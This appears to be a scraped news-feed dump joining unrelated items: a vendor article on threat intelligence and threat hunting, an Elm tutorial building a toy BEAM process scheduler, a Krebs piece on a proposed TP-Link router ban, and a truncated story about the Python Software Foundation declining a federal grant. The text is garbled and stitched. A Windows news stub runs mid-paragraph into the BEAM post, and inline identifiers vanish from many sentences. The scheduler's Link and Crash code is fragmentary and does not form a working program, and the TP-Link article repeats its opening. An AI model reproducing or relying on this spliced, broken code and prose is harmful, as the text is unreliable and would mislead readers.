they’re doing it, and how they operate.Threat intelligence teams collect data from a wide range of sources and organize it into actionable insights. This process typically involves: Data can come from internal feeds as well as from external sources and research. Threat intelligence teams will pull in indicators of compromise (IOCs), like malicious IPs, domains, malware hashes, phishing emails, and more.Analyzing and contextualizing: Teams will then correlate the data to identify threats and patterns, looking for context to inform who is behind an attack, understand their motivations, and determine the tactics, techniques, and procedures (TTPs) being used.Disseminating intelligence: Threat intelligence is growing in importance across all business functions. Once data has been collected and analyzed, it gets shared with any other teams who might need it, from SOC analysts and incident responders to risk managers and executives. – high-level trends and insights for non-technical audiences (e.g., CISOs, business leaders) that inform policies and long-term strategies – details on specific campaigns, threat actors, or attacks in progress that provide defenders with information like attack timelines or tools used – TTPs and IOCs that inform real-time defense, used directly by SOC teams to tune detection systems – highly technical data usually meant for machine consumption or enrichment of security tools (sometimes overlaps with tactical intelligence but is often more granular and feeds into automation)Ultimately, the purpose of threat intelligence is to enable proactive, evidence-based decision-making in cybersecurity. It reduces uncertainty and helps security teams more effectively allocate resources to mitigate threats before they impact the business. And organizations that prioritize maturing their threat intelligence programs will be better positioned to anticipate emerging threats and shore up defenses before an attack strikes.Threat hunting is a proactive investigative practice in which security analysts actively look for signs of malicious activity or compromise that have evaded traditional security defenses. Threat hunting assumes that attackers may already be lurking in networks and systems undetected and seeks to find them through expert analysis and intuition.Key aspects of threat hunting typically include:Hypothesis-driven investigations: Threat hunters often begin with a hunch or educated guess about a potential threat and then seek evidence to prove or disprove that hypothesis.Behavioral analysis and anomaly detection: Hypothesis-driven investigations often stem from careful behavioral analysis (identifying suspicious patterns in system or user behavior) and anomaly detection (scrutinizing logs and telemetry for anything that doesn’t fit normal patterns).Specific usage of tools and data: Threat hunters leverage common tools (such as SIEM platforms, EDR solutions, and network analysis tools) but use them in a more proactive way. They also use threat intelligence platforms or feeds to enrich what they find and correlate hints across multiple data sources to uncover stealthy threats.Instead of only responding after an incident, threat hunting aims to catch intrusions in their early stages or discover ongoing attacks that haven’t even been noticed yet. Common techniques include:Searching for known IOCs based on threat intelligenceTracking TTPs using frameworks like MITRE ATT&CK and looking for evidence of specific tacticsLeveraging machine learning and advanced analytics to help surface unusual patterns across large data setsEnsuring continuous and iterative hunting, refining hypotheses and adapting quicklyEssentially, threat hunting is a human-driven, proactive hunt for hidden threats. It requires skilled analysts who think like attackers and have the curiosity and patience to dig into data and pursue hidden leads. With a mature threat hunting program, an organization can speed up detection and containment, ultimately leading to less damage from breaches.Threat Intelligence and Threat Hunting: Key DifferencesThreat intelligence and threat hunting are closely related, but it’s important to understand how they differ across several dimensions—such as focus, timing, outputs, and primary users—which in turn helps inform how to best leverage the two practices most effectively.External threat landscape – “what’s currently (or soon might be) out there”“are any of those threats in here right now?”More preparatory – analyzes past attacks and ongoing behaviors to inform future defensesProactive by nature – initiates investigations before a security incident is fully apparentKnowledge – produces insights that guide security strategy (e.g., threat reports, advisories, risk scores)Investigation findings – produces detections within the environment or validates the absence of threatsThreat intelligence analysts or researchers – often will have backgrounds in analysis, malware research, or counterintelligenceSkilled SOC analysts or dedicated threat hunters – typically will have deep knowledge of systems, networks, forensics, and attacker behaviorInformation-centric – heavily analytical, mainly using threat intelligence platforms, databases, OSINT resources, etc.Investigation-centric – heavily operational, mainly using tools like SIEM, EDR, and network monitorsDespite these differences, threat intelligence and threat hunting are both essential for an organization’s cybersecurity strategy. In fact, using one without the other leaves a significant gap—knowing about threats isn’t useful if an organization is not looking for them internally, and hunting blindly without intelligence is inefficient.How Threat Intelligence Powers Threat HuntingThreat intelligence and threat hunting are deeply interconnected strategies that, when executed correctly, can deliver a more thorough security and protection plan for organizations. Threat intelligence in particular often serves as the necessary fuel for successful threat hunting.Guiding hypotheses and focus areas: Threat intelligence provides the starting point for many threat hunts, acting as a roadmap that highlights where threat hunters should look first or what TTPs to look out for.Providing indicators and context: Threat hunters rely on threat intelligence feeds for high-confidence IOCs that they can search for in log data. Threat intelligence also adds helpful context to any suspicious events threat hunters may find, making the search more efficient and effective by enriching data with meaning.Enabling proactive hunting for emerging threats: Intelligence about external vulnerabilities and exploits can prompt internal hunts to ensure that defenses held up or to catch any successful penetration early, before any damage is caused.Improving hunting tools and analytics: Integrating threat intelligence feeds into security monitoring tools (SIEMs, EDRs, etc.) effectively bakes intel into the hunting process, allowing threat hunters to better prioritize their investigations.Overall, threat intelligence and threat hunting operate in a feedback loop: intelligence guides threat hunters on where to look, and whatever they find feeds back into the overall intelligence picture. Each makes the other stronger, and together they enable a much more proactive and informed defense.Benefits of Combining Threat Intelligence and Threat HuntingHow exactly does an organization benefit by integrating their threat intelligence and threat hunting operations? When both practices are used in concert, the results can immeasurably strengthen an organization’s overall security effectiveness.Benefits of integration can include:Faster detection of advanced threats: A combined approach helps identify stealthy attacks sooner than either practice alone. When threat hunters are boosted by threat intelligence, they can zero in on serious threats that automated systems might have missed, reducing dwell time and limiting breach impacts.More effective prioritization of alerts and resources: Integration helps teams differentiate noise from truly critical warnings. Context like risk scores, known malicious indicators, or prevalence of a threat allows threat hunters and SOC analysts focus on what matters most.Stronger overall security posture and resilience: Perhaps the biggest payoff of combining threat intelligence and threat hunting is a more robust and dynamic defense. With the internal vigilance from threat hunting and the external knowledge gained from threat intelligence, the two functions effectively cover both preparation and detection.Adaptive, intelligence-driven defense: The ability to adapt to threats in real-time is a major benefit to a well-integrated security program. Swapping information quickly between threat intelligence and threat hunting makes an organization more responsive and resilient.Threat intelligence and threat hunting can certainly be used independently, and each has the potential to provide useful knowledge to strengthen defenses. But there’s no doubt that an integrated approach transforms an organization’s security strategy from a reactive endeavor to a proactive, intelligence-driven mission.How Recorded Future Utilizes Threat Intelligence and Threat Hunting TogetherThe right tools and platforms play a crucial role in helping organizations bring together threat intelligence and threat hunting in the most seamless, efficient manner. Recorded Future’s Intelligence Cloud is a prime example of a solution designed to unify global threat intelligence with an organization’s security operations, empowering both threat intel analysts and threat hunters on the same platform.Pulling from a breadth of sources (including the open web, dark web, technical feeds, forums, malware repositories, and more), it delivers a holistic view of threats targeting organizations worldwide. All of this intelligence is continuously updated and made available in a searchable, contextualized form.For a threat intelligence analyst, this means instant access to high-quality intel without hours of manual research. For a threat hunter, it means any IOC or clue they come across can be immediately enriched with crucial context, significantly speeding up investigations.One of the biggest strengths a platform like this can have is seamless integration with the tools security teams already use. This means that threat intelligence isn’t locked in a separate silo but instead flows directly into day-to-day security workflows.For example, through Recorded Future’s integrations, analysts can:See risk scores or threat labels next to each log event in a SIEM dashboardEnable automated hunting actions or incident response through SOAR integrationPivot from an indicator they’re investigating to see the wider intelligence context via powerful query capabilities and browser plug-insThese integrations essentially transform threat intelligence and threat hunting into a sum greater than its parts. Practical use cases include:Alert enrichment and triage so threat hunters and incident responders can prioritize and scope appropriatelyThreat hunting “packages” that analysts can search against internallyIntegration with case management so that whether a threat hunter is documenting a new finding or an analyst is writing up an important report, it’s all connectedVulnerability hunting, which helps prioritize which weaknesses to hunt for signs of exploitationPlatforms like Recorded Future’s Intelligence Cloud essentially act as a force multiplier for security teams, combining the scale and speed of machine-driven intelligence with the human-led insight of threat hunting.A Combined Approach for Resilient SecurityThreat intelligence and threat hunting each cover vital ground in an organization’s cybersecurity strategy. Adopting a combined approach means fostering collaboration between intelligence analysts and threat hunters and equipping them with the tools and platforms that bridge their workflows to create that complementary feedback loop.When done correctly, the line between threat intelligence and threat hunting blurs, with threat hunting becoming more intelligence-driven and intelligence becoming more action-oriented.Ready to fortify your security program? Consider how Recorded Future’s Intelligence Cloud can help unite threat intelligence and threat hunting and operationalize that combined approach. Get started here.How do threat hunting and threat intelligence impact an organization’s overall security strategy?Threat intelligence provides context and insight into potential risks, while threat hunting proactively seeks out hidden threats. Both are essential for building a comprehensive, dynamic security posture that improves detection and response.What are the best practices for integrating threat hunting and threat intelligence workflows?Best practices may include establishing clear communication between teams, using threat intelligence to guide hunting hypotheses, and leveraging automated tools to integrate intelligence into hunting operations.How can threat intelligence inform proactive threat hunting tactics?Threat intelligence provides actionable insights like known attacker tactics, techniques, and procedures (TTPs), which can help inform hunting strategies and narrow down specific areas to search for potential threats.What skills and tools are required for effective threat hunting versus utilizing threat intelligence?Threat hunting requires strong analytical skills and expertise in security tools, while threat intelligence relies on data analysis and contextual understanding. Tools like SIEM, threat intelligence platforms, and automated solutions support both functions effectively.]]></content:encoded></item><item><title>Manassas City Public Schools close on Monday due to cyberattack</title><link>https://databreaches.net/2025/11/09/manassas-city-public-schools-close-on-monday-due-to-cyberattack/?pk_campaign=feed&amp;pk_kwd=manassas-city-public-schools-close-on-monday-due-to-cyberattack</link><author>Dissent</author><category>databreach</category><pubDate>Sun, 9 Nov 2025 23:43:41 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>How to use the new Windows 11 Start menu, now rolling out</title><link>https://www.bleepingcomputer.com/news/microsoft/how-to-use-the-new-windows-11-start-menu-now-rolling-out/</link><author>Mayank Parmar</author><category>security</category><pubDate>Sun, 9 Nov 2025 23:28:57 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[The Windows Start menu is getting its first major redesign since 2021 and will be rolled out to everyone with the November 11 Patch Tuesday update.

See Wikipedia.I was always fascinated with BEAM, how it allowed easy spawning of processes that didn’t share state, allowed for sending and selectively receiving messages, and linking to each other thus enabling creation of supervision trees.It’s an interesting set of primitives that interact in a nice way, and are in my view responsible for much of the appeal of BEAM languages. I wanted to see how much it takes to support these primitives, and I set out to write my own toy MVP implementation of BEAM.As a disclaimer, I haven’t read The BEAM Book yet, and how I do things might differ substantially from how the real BEAM does things. This is an exploration from first principles based on how I perceive BEAM from the outside, and doesn’t aim for truthfulness to the reference implementation, real world usefulness nor performance.The below examples are written in Elm, but if you can express it in Elm, you can express it in anything (it’s purely functional so there’s no mutation, it’s single threaded and has no concurrency primitives, etc.).I will only be making the scheduler and its main loop, not a full-blown language or VM. This allows me to only keep a few hardcoded examples around and skip writing a parser, CLI and a bunch more parts that a real compiler would have.In the interest of skipping as much work as possible, I’ll be using continuation passing style (CPS) for the example programs instead of the usual “list of statements” style:-- ☑️ YES: continuations
type Program
    = End
    | Work Int K
    | Spawn Program KPid
    | Send Pid String K
    | Receive String K
    | Crash
    | Link Pid K

type alias K =
    () -> Program

type alias KPid =
    Pid -> Program

-- ❌ NO: list of statements
type Stmt
    = Let String Expr
    | Work Int
    | Spawn Program
    | Send Pid String
    | Receive String Program
    | Crash
    | Link Pid

type alias Program =
    List Stmt
This means I don’t have to care about environments, bindings, scopes, return values, expressions and so on, as this will be handled by the continuation arguments in the host language:ex5 : Program
ex5 =
    Spawn ex5Child       <| \childPid ->
    Send childPid "Ping" <| \() ->
    End

ex5Child =
    Work 10 <| \() ->
    End
In case you’re having issues reading the  operator, you can imagine a pair of parentheses instead:ex5 : Program
ex5 =
    Spawn ex5Child       (\childPid ->
    Send childPid "Ping" (\() ->
    End
    ))

ex5Child =
    Work 10 (\() ->
    End
    )
The continuations in all the non-terminal instructions force us to provide at least one terminal, otherwise we couldn’t write a valid  value.Let’s then start by implement one of the terminals, . It’s a no-op, but it will allow me to show off the structure of the scheduler.type Program =
    End

ex1 : Program
ex1 =
    End

type alias Scheduler =
    { program : Program }

init : Program -> Scheduler
init program =
    { program = program }

step : Scheduler -> Scheduler
step sch =
    case sch.program of
        End -> sch
Oh no, the visualizer didn't load!Everything will revolve around this  type and its  function. Now let’s expand our capabilities.Instead of wasting time implementing instructions for  work (mathematic operators, function calls, etc.), let’s encompass this all with a dummy  instruction, holding the amount of work (in units that will start making sense soon) and a continuation with what to do after the work:type Program
    = End
    -- Added:
    | Work Int K

type alias K =
    () -> Program

ex2 : Program
ex2 =
    Work 5 <| \() ->
    End
The example holds a program that will “work” for 5 units of work then end.We need to add this new instruction to our  function:step : Scheduler -> Scheduler
step sch =
    case sch.program of
        End -> sch
        -- Added:
        Work n k -> { sch | program = k () }
For now we’ll just ignore how much work it’s supposed to be, and continue with the rest of the program (result of calling the continuation: ).Oh no, the visualizer didn't load!Let’s do something ! We’ll add a way to spawn other processes, thus making our programs concurrent.type Program =
    -- ...
    | Spawn Program KPid

type alias KPid =
    Pid -> Program

type alias Pid =
    Int

ex3 : Program
ex3 =
    Work 5         <| \() ->
    Spawn ex3Child <| \childPid ->
    Work 5         <| \() ->
    End

ex3Child : Program
ex3Child =
    Work 10 <| \() ->
    Work 10 <| \() ->
    End
Whenever we spawn another process, we’ll receive its PID in the continuation, which will be useful later for messaging and other tasks.This marks a big change in our : suddenly we have to track multiple processes instead of just one!type alias Scheduler =
    { processes : Dict Pid Proc
    , nextUnusedPid : Pid
    , readyQueue : Queue Pid
    }

type alias Proc =
    { program : Program }

init : Program -> Scheduler
init program =
    { processes = Dict.empty
    , nextUnusedPid = 0
    , readyQueue = Queue.empty
    }
        |> spawn program
        |> Tuple.first -- discard the spawned PID

spawn : Program -> Scheduler -> ( Scheduler, Pid )
spawn program sch =
    let pid = sch.nextUnusedPid in
    ( { sch
        | processes =
            sch.processes
                |> Dict.insert pid (initProc program)
        , nextUnusedPid = pid + 1
      }
        |> enqueue pid
    , pid
    )

initProc : Program -> Proc
initProc program =
    { program = program }

enqueue : Pid -> Scheduler -> Scheduler
enqueue pid sch =
    { sch
        | readyQueue =
            if List.member pid (Queue.toList sch.readyQueue)
            then sch.readyQueue
            else sch.readyQueue |> Queue.enqueue pid
    }
We hold the processes in a  collection now, there’s a bit of bookkeeping for incrementing PIDs, and a new concept: the “ready queue.”This queue will tell our scheduler which process to run next. This means our  function needs to change considerably: previously it was able to just pick the (only) program with , but now it needs to pick a PID from the queue, then find it in the dictionary,  run it:step : Scheduler -> Scheduler
step sch =
    case Queue.dequeue sch.readyQueue of
        Nothing -> sch
        Just ( pid, restOfQueue ) ->
            let newSch = { sch | readyQueue = restOfQueue } in
            case Dict.get pid newSch.processes of
                Nothing   -> newSch
                Just proc -> newSch |> stepInner pid proc

stepInner : Pid -> Proc -> Scheduler -> Scheduler
stepInner pid proc sch =
    case proc.program of
        End -> sch

        Work n k ->
            sch
                |> updateProc pid (setProgram (k ()))
                |> enqueue pid

updateProc : Pid -> (Proc -> Proc) -> Scheduler -> Scheduler
updateProc pid fn sch =
    { sch | processes =
        sch.processes
            |> Dict.update pid (Maybe.map fn)
    }

setProgram : Program -> Proc -> Proc
setProgram newProgram proc =
    { proc | program = newProgram }
The specifics of  had to change as well: we can’t set the single  anymore, we need to update an entry for a PID in the processes dictionary.Let’s not forget about the new instruction:stepInner pid proc sch =
    -- ...
    Spawn childProgram kpid ->
        let ( schWithChild, childPid ) =
                sch |> spawn childProgram
        in schWithChild
               |> updateProc pid (setProgram (kpid childPid))
               |> enqueue pid
We reuse the  function from before. It gives us the child’s PID, which we can use to access the rest of the parent program via the continuation: .We need to remember to enqueue the parent again (the program given by the continuation hasn’t run yet); the child has already been enqueued in the  function.Our scheduler now takes 7 steps to finish the whole program, which corresponds to the 7 instructions in our initial program.Oh no, the visualizer didn't load!Can you see any potential issues with our current Scheduler?The concurrency we have implemented is : a started process won’t be stopped by the scheduler in the middle. Consider this program:ex4 : Program
ex4 =
    Work 5         <| \() ->
    Spawn ex4Child <| \childPid ->
    Work 5         <| \() ->
    End

ex4Child : Program
ex4Child =
    Work 999 <| \() -> -- !!!
    Work 10  <| \() ->
    End
This only differs from example 3 by the amount of work the child is doing. The parent can’t finish its tiny bit of work after the spawn until the child finishes its 999 units of work.The way BEAM solves this is with a  it creates an illusion of  scheduling on top of the cooperative one by inserting yield points after every function call, decrementing its reduction budget in each, and once the budget reaches 0, the scheduler will pause the process and start another one from the queue.This works surprisingly well: in BEAM languages, you iterate through lists via recursion →  there’s a lot of function calls →  a lot of yield points.We’ll do something similar in our toy implementation: introduce a reduction budget, and make the  instruction only do as much “work” as the budget allows.reductionBudget : Int
reductionBudget =
    7 -- BEAM sets this to 4000.

step : Scheduler -> Scheduler
step sch =
    -- ...
    sch |> stepInner pid proc {- added: -} reductionBudget

stepInner : Pid -> Proc -> Int -> Scheduler -> Scheduler
stepInner pid proc budget sch =
    if budget <= 0
    then sch
         |> setProc pid proc
         |> (if shouldEnqueue proc
             then enqueue pid
             else identity)
    else -- ...

shouldEnqueue : Proc -> Bool
shouldEnqueue proc =
    case proc.program of
        -- Optimization: if we ended up on `End`,
        -- we don't need to run again.
        End -> False
        Work _ _ -> True
        Spawn _ _ -> True

setProc : Pid -> Proc -> Scheduler -> Scheduler
setProc pid newProc sch =
    sch
        |> updateProc pid (\_ -> newProc)
Above we’re dealing with the case where the process ran out of the budget. The scheduler will remember where it ended, re-enqueue it if there’s more work to do (if we’re not at the  instruction), and stop the current step.Let’s flesh out the rest of :stepInner pid proc budget sch =
    -- ...
    else
    let
        stop : Scheduler -> Scheduler
        stop sch_ =
            sch_ |> stepInner pid program 0

        continue : Program -> Int -> Scheduler -> Scheduler
        continue newProgram newBudget sch_ =
            sch_ |> stepInner pid newProgram newBudget
    in
    -- ...
Here I’m making helpers for working with the budget.  sets the budget to 0 and recurses, so that we go straight to the  code path. instead sets the budget to some arbitrary number we provided. Usually we’ll decrement the current budget by 1, but in case of  we’ll jump in larger increments.stepInner pid proc budget sch =
    -- ...
    in
    case program of
        End -> sch |> stop

        Spawn childProgram kpid ->
            let ( schWithChild, childPid ) =
                    sch |> spawn childProgram
            in schWithChild
                   |> continue (kpid childPid) (budget - 1)

        Work n k ->
            if n <= 0
            then sch |> enqueue pid
                     |> continue (k ()) budget
            else let workDone = min n budget
                     workRemaining = n - workDone
                     budgetRemaining = budget - workDone
                 in sch |> continue (Work workRemaining k)
                                    budgetRemaining
The  instruction now works completely differently: instead of doing all the work at once (going straight for ), it now finally cares about the amount of work present.We will only continue with  if there’s no more work to be done ().Otherwise we calculate how much work  be done, and update the remaining work and budget accordingly.Oh no, the visualizer didn't load!Take a look at the first few steps after the child spawns:PID 0 runs, 4 -> 0 -> EndThus, even though the child has a lot of work to be done, the scheduler preempts and only lets it do the work in chunks of 7, and the parent process gets a chance to do some of its work as well.Spawning processes without letting them communicate is not very useful. It might help move computations off the main thread, but obviously we’ll want some inter-process communication eventually.Let’s add a way to send messages to processes. (Receiving them will come later.)type Program
    = -- ...
    | Send Pid String K

shouldEnqueue : Proc -> Bool
shouldEnqueue proc =
    -- ...
    Send _ _ _ -> True

ex5 : Program
ex5 =
    Spawn ex5Child       <| \childPid ->
    Send childPid "Ping" <| \() ->
    End

ex5Child : Program
ex5Child =
    Work 10 <| \() ->
    End
To implement this  instruction, we’ll need to introduce the concept of type alias Proc =
    { program : Program
    -- Added:
    , mailbox : Queue String
    }
Sending a message will be done by putting the message into this mailbox. We can do that because we have access to the whole scheduler, we are not limited to just the current process’ resources:stepInner pid proc budget sch =
    -- ...
    Send destinationPid message k ->
        sch
            |> send destinationPid message
            |> continue (k ()) (budget - 1)

send : Pid -> String -> Scheduler -> Scheduler
send destinationPid message sch =
    sch
        |> updateProc destinationPid (enqueueMessage message)
        |> enqueue destinationPid

enqueueMessage : String -> Proc -> Proc
enqueueMessage message proc =
    { proc | mailbox = proc.mailbox |> Queue.enqueue message }
When we send a message to a process, we also enqueue it to make sure it has a chance to process it. This will become important later, when processes go to sleep (ie. don’t enqueue) after not finding any interesting message for their selective receive. We’ll get there!Oh no, the visualizer didn't load!The child has the message in its mailbox, but can’t react to it. Let’s fix that!type Program
    = -- ...
    | Receive String K
This is a substantial simplification from what the real BEAM needs to support: Erlang receive statement allows for multiple branches, pattern matching inside the branches, timeouts when there’s no interesting message present for a certain amount of time, and so on.We will instead only support a single string message with no destructuring. The process won’t continue until this specific string is found in the mailbox.ex6 : Program
ex6 =
    Spawn ex6Child       <| \childPid ->
    Send childPid "Ping" <| \() ->
    End

ex6Child : Program
ex6Child =
    Receive "Ping" <| \() -> 
    Work 10        <| \() ->
    End
We can make an interesting optimization in the  function:shouldEnqueue proc =
    -- ...
    -- Optimization: we don't need to `Receive`
    -- if there's no interesting message.
    Receive wantedMsg _ ->
        Queue.toList proc.mailbox
            |> List.any (\msg -> msg == wantedMsg)
This means we won’t reenqueue a process at the end of  if it’s waiting for a message that’s not present in its mailbox. There’s no reason for the process to try again until a new message is received, so the process will instead go to sleep and wait to be woken up later in the  function.There’s a wall of code coming up, brace yourselves! When interpreting the  instruction, we’ll go through messages until we find the wanted one. If we find it, remove it from the mailbox and use the continuation, otherwise go to sleep with the mailbox intact.stepInner pid proc budget sch =
    -- ...
    continue_ : Proc -> Int -> Scheduler -> Scheduler
    continue_ newProc newBudget sch_ =
        sch_ |> stepInner pid newProc newBudget
    -- ...
    Receive wantedMsg k ->
        let processMessages : List String -> Queue String -> Scheduler
            processMessages unmatchedStartRev restOfMailbox =
                case Queue.dequeue restOfMailbox of
                    -- NO MORE MSGS TO CHECK
                    Nothing ->
                        sch |> stop

                    Just ( msg, restOfMailboxWithoutThis ) ->
                        if msg == wantedMsg then
                            -- FOUND IT
                            let newMailbox =
                                  Queue.fromList
                                      (List.reverse unmatchedStartRev
                                          ++ Queue.toList restOfMailboxWithoutThis)
                            in
                                sch |> continue_
                                           (proc
                                               |> setMailbox newMailbox
                                               |> setProgram (k ())
                                           )
                                           (budget - 1)

                        else 
                            -- TRY NEXT
                            processMessages
                                 (msg :: unmatchedStartRev)
                                 restOfMailboxWithoutThis
        in
        processMessages [] proc.mailbox

setMailbox : Queue String -> Proc -> Proc
setMailbox newMailbox proc =
    { proc | mailbox = newMailbox }
This code is not very elegant due to plucking a message from the middle of a queue, but it does what I described in the previous paragraph.Oh no, the visualizer didn't load!You can see things have lined up nicely: process 1 has  in its mailbox and also is about to try and . In the next step the message is gone and the process is doing . Success!For the last piece of the puzzle, let’s look at the feature that gives rise to supervision trees:  processes together.Linking is bidirectional; the scheduler will send a system message to the other side of the link whenever a linked process exits (in our example, crashes). The receiving side can choose to react to this exit signal: respawn the other process? Crash ourselves? Log it somewhere and do cleanup?Note: BEAM also has  These are one-directional, and I’ll skip them in this blogpost.type Program
    = -- ...
    | Crash
    | Link Pid K

type alias Proc =
    { -- ...
    , links : Set Pid
    }

initProc program =
    { -- ...

    }

ex7Child : Program
ex7Child =
    Crash

shouldEnqueue proc =
    -- ...
    Crash    -> True
    Link _ _ -> True
Why ? The  instruction is a terminal, but it has work to do inside (sending the system messages), so we’ll enqueue it if it hasn’t run yet. (We’ll replace  with  after doing that work.)stepInner pid proc budget sch =
    -- ...
    Link linkedPid k ->
        sch

        |> updateProc pid2 (addLink pid1)

addLink : Pid -> Proc -> Proc

        sch_ |> stepInner pid newProc 0

In a real-world interpreter, we’d distinguish between user messages and system messages by using an ADT, but for this toy implementation, the above will be enough.Oh no, the visualizer didn't load!It works in the Ellie link above, but not in the visualizer. Why? Their reduction budget is different. The Ellie demo manages to run  and  without anything else running in between, but the visualizer has reduction budget of 1, and so the child es before the parent manages to  to it.This can be fixed by making the instruction pair a single atomic instruction, and BEAM does this with the  function. You can try it online or click the  button in the demo above.And that’s all! We have implemented:sending and selectively receiving messagesan illusion of preemptive scheduling on top of cooperative scheduling using a reduction budgetlinking between processes, essentially adding hooks for when a related process stops for some reasonThese primitives combine together in nice ways, giving rise to BEAM’s reputation. I think they’re pretty neat, and I hope this toy implementation demystified them a little bit for you!]]></content:encoded></item><item><title>Drilling down on Uncle Sam&apos;s proposed TP-Link ban</title><link>https://krebsonsecurity.com/2025/11/drilling-down-on-uncle-sams-proposed-tp-link-ban/</link><author>todsacerdoti</author><category>dev</category><pubDate>Sun, 9 Nov 2025 18:17:44 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[The U.S. government is reportedly preparing to ban the sale of wireless routers and other networking gear from , a tech company that currently enjoys an estimated 50% market share among home users and small businesses. Experts say while the proposed ban may have more to do with TP-Link’s ties to China than any specific technical threats, much of the rest of the industry serving this market also sources hardware from China and ships products that are insecure fresh out of the box.A TP-Link WiFi 6 AX1800 Smart WiFi Router (Archer AX20). recently reported that more than a half-dozen federal departments and agencies were backing a proposed ban on future sales of TP-Link devices in the United States.

That price point (and consistently excellent performance ratings) has made TP-Link a favorite among Internet service providers (ISPs) that provide routers to their customers.In August 2024, the chairman and the ranking member of the House Select Committee on the Strategic Competition Between the United States and the Chinese Communist Party called for an investigation into TP-Link devices, which they said were found on U.S. military bases and for sale at exchanges that sell them to members of the military and their families.“TP-Link’s unusual degree of vulnerabilities and required compliance with PRC law are in and of themselves disconcerting,” the House lawmakers warned in a letter (PDF) to the director of the Commerce Department. “When combined with the PRC government’s common use of SOHO [small office/home office] routers like TP-Link to perpetrate extensive cyberattacks in the United States, it becomes significantly alarming.”The letter cited a May 2023 blog post by  about a Chinese state-sponsored hacking group dubbed “” that used a malicious firmware implant for some TP-Link routers to carry out a sequence of targeted cyberattacks against European foreign affairs entities.

Microsoft found the hacker groups were leveraging the compromised TP-Link systems to conduct “password spraying” attacks against Microsoft accounts. Password spraying involves rapidly attempting to access a large number of accounts (usernames/email addresses) with a relatively small number of commonly used passwords.TP-Link rightly points out that most of its competitors likewise source components from China. The company also correctly notes that advanced persistent threat (APT) groups from China and other nations have leveraged vulnerabilities in products from their competitors, such as Cisco and Netgear.But that may be cold comfort for TP-Link customers who are now wondering if it’s smart to continue using these products, or whether it makes sense to buy more costly networking gear that might only be marginally less vulnerable to compromise.Almost without exception, the hardware and software that ships with most consumer-grade routers includes a number of default settings that need to be changed before the devices can be safely connected to the Internet. For example, bring a new router online without changing the default username and password and chances are it will only take a few minutes before it is probed and possibly compromised by some type of Internet-of-Things botnet. Also, it is incredibly common for the firmware in a brand new router to be dangerously out of date by the time it is purchased and unboxed.Until quite recently, the idea that router manufacturers should make it easier for their customers to use these products safely was something of an anathema to this industry. Consumers were largely left to figure that out on their own, with predictably disastrous results.But over the past few years, many manufacturers of popular consumer routers have begun forcing users to perform basic hygiene — such as changing the default password and updating the internal firmware — before the devices can be used as a router. For example, most brands of “mesh” wireless routers — like Amazon’s Eero, Netgear’s Orbi series, or Asus’s ZenWifi — require online registration that automates these critical steps going forward (or at least through their stated support lifecycle).For better or worse, less expensive, traditional consumer routers like those from Belkin and Linksys also now automate this setup by heavily steering customers toward installing a mobile app to complete the installation (this often comes as a shock to people more accustomed to manually configuring a router). Still, these products tend to put the onus on users to check for and install available updates periodically. Also, they’re often powered by underwhelming or else bloated firmware, and a dearth of configurable options.Of course, not everyone wants to fiddle with mobile apps or is comfortable with registering their router so that it can be managed or monitored remotely in the cloud. For those hands-on folks — and for power users seeking more advanced router features like VPNs, ad blockers and network monitoring — the best advice is to check if your router’s stock firmware can be replaced with open-source alternatives, such as OpenWrt or DD-WRT.These open-source firmware options are compatible with a wide range of devices, and they generally offer more features and configurability. Open-source firmware can even help extend the life of routers years after the vendor stops supporting the underlying hardware, but it still requires users to manually check for and install any available updates.Happily, TP-Link users spooked by the proposed ban may have an alternative to outright junking these devices, as many TP-Link routers also support open-source firmware options like OpenWRT. While this approach may not eliminate any potential hardware-specific security flaws, it could serve as an effective hedge against more common vendor-specific vulnerabilities, such as undocumented user accounts, hard-coded credentials, and weaknesses that allow attackers to bypass authentication.Regardless of the brand, if your router is more than four or five years old it may be worth upgrading for performance reasons alone — particularly if your home or office is primarily accessing the Internet through WiFi.NB: The Post’s story notes that a substantial portion of TP-Link routers and those of its competitors are purchased or leased through ISPs. In these cases, the devices are typically managed and updated remotely by your ISP, and equipped with custom profiles responsible for authenticating your device to the ISP’s network.

Experts say while the proposed ban may have more to do with TP-Link’s ties to China than any specific technical threats, much of the rest of the industry serving this market also sources hardware from China and ships products that are insecure fresh out of the box.A TP-Link WiFi 6 AX1800 Smart WiFi Router (Archer AX20). recently reported that more than a half-dozen federal departments and agencies were backing a proposed ban on future sales of TP-Link devices in the United States.

As the Python Software Foundation‘s (PSF) principal investigator for a $1.5 million grant National Science Foundation application, Larson had a front-row seat for the multiround, months-long vetting process — and to everything that happened next.In short, the PSF turned the grant down after discovering new federal “terms and conditions” that would require them to end any programs promoting Diversity, Equity, and Inclusion (DEI) “during the term of this financial assistance award.” But a flood of new donations followed, and the PSF vowed to explore other funding options while remaining steadfast to their organizational values.“It was so maddening to have to turn down work that would benefit everyone,” postedLoren Crary, PSF deputy executive director, on Reddit, “because they insisted on dictating what we do outside of the security project.”Yet rejecting the grant created a surge in news coverage, thousands of upvotes on social media and an upswell of donations. Together, maybe that show of support forms a kind of collective answer — an example of how a community responds to a forceful outside attempt to challenge their culture.Support From Guido — and Thousands of Others“I was one of the board members who voted to reject this funding — a unanimous but tough decision,” wrote Simon Willisonon his blog. “I’m proud to serve on a board that can make difficult decisions like this.”And Python’s original creator, Guido van Rossum, even made his own post of support on X, formerly known as Twitter. “If you haven’t heard about this, kudos to the PSF for standing for its values (which are also my values).”The day of the announcement, the PSF received about 300 new donations, Crary said — but then they’d kept coming. On Tuesday (Oct. 28), one Reddit user even complained their first try at donating was met with a timeout error — and Crary responded that apparently, “Our donation page got a little overwhelmed.”Crary — who had also been the co-principal investigator on the withdrawn application — also acknowledged the supportive responses on Python’s official discussion forum, writing “We’re very grateful for the community’s support, which has been pouring in and has honestly been a little overwhelming.”Throughout that week, Crary responded to several people who announced they were making donations to the PSF as a show of support. “I can’t tell you how much it has meant to see the community stand up with us today, after sitting with these tough circumstances for a while,” she said.On Friday, less than two weeks after the announcement, the organization had seen some inspiring numbers, Deb Nicholson, PSF executive director, told TNS. “We’ve raised over $157,000,” including 295 new Supporting Members paying an annual $99 membership fee. And that’s just the beginning. “We know some donors are pursuing an employer match, and some community members have started their own matching campaign, which will also bump those numbers up.”“It doesn’t quite bridge the gap of $1.5 million, but it’s incredibly impactful for us, both financially and in terms of feeling this strong groundswell of support from the community.”“We zero percent expected a 